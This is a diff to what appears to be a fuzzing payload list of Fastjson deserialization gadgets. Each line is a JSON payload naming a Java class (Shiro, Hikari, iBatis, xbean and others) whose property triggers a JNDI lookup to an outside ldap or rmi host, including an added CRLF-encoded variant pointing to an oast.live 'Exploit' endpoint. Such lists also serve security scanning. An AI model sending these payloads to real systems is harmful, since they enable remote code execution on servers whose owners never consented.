@@ -63,6 +63,7 @@ FUZZ:
 {"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"ldap://fast.bugseek.dnslog.cn/Calc"}
 {"@type":"org.apache.cocoon.components.slide.impl.JMSContentInterceptor", "parameters": {"@type":"java.util.Hashtable","java.naming.factory.initial":"com.sun.jndi.rmi.registry.RegistryContextFactory","topic-factory":"ldap://fast.bugseek.dnslog.cn/Calc"}, "namespace":""}
 {"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://fast.bugseek.dnslog.cn/Calc"}}
+{%0d%0a "@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig",%0d%0a "properties":{%0d%0a "@type":"java.util.Properties",%0d%0a "UserTransaction":"rmi://cbfotf38nc6lpa800010ocfhjaiz88obp.oast.live/Exploit"%0d%0a }%0d%0a}
 {"@type":"org.apache.xbean.propertyeditor.JndiConverter","asText":"ldap://fast.bugseek.dnslog.cn/Calc"}
 {"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["ldap://fast.bugseek.dnslog.cn/Calc"], "Realms":[""]}
 {"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://fast.bugseek.dnslog.cn/Calc"}
